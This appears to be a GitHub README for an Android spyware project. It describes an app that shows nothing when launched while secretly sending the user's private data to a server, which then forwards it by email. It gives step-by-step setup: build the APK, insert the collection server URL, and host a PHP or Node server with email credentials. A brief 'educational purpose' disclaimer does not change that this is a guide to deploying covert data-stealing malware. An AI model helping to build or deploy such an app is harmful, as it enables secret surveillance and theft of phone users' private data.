# Android-PayLoad
This app does nothing when launched.. It secretely sends private data of the user to a server and then from server to email... Only for educational purpose.. Email is sent using PHPMailer.. https://github.com/PHPMailer/PHPMailer. 

#Instruction

The client (android app) does not require any setup. Just make the apk using Android Studio and add the server url in client/app/src/main/java/com/ankit/serverconnect/ConnectionService.java in line 77.<br>
The server is written on two platforms (PHP and Node) you can use either of them.<br>

#PHP

For setting PHP server you need PHP Mailer:<br>
1) Make the folder server/PHP/phpmailer.<br>
2) Download class.phpmailer.php, class.pop3.php, class.smtp.php and PHPMailerAutoload.php from PHPMailer (https://github.com/PHPMailer/PHPMailer) and store it in phpmailer folder.<br>
3) Enter the sender and reciever emails and sender password and other details in email.php.<br>
4) It's all setup now host the php files and done.<br>

#Node

For setting Node server:<br>
1) run npm update.<br>
2) If all dependencies in package.json are not installed, install them.<br>
3) ll done! Now just host the files.<br>
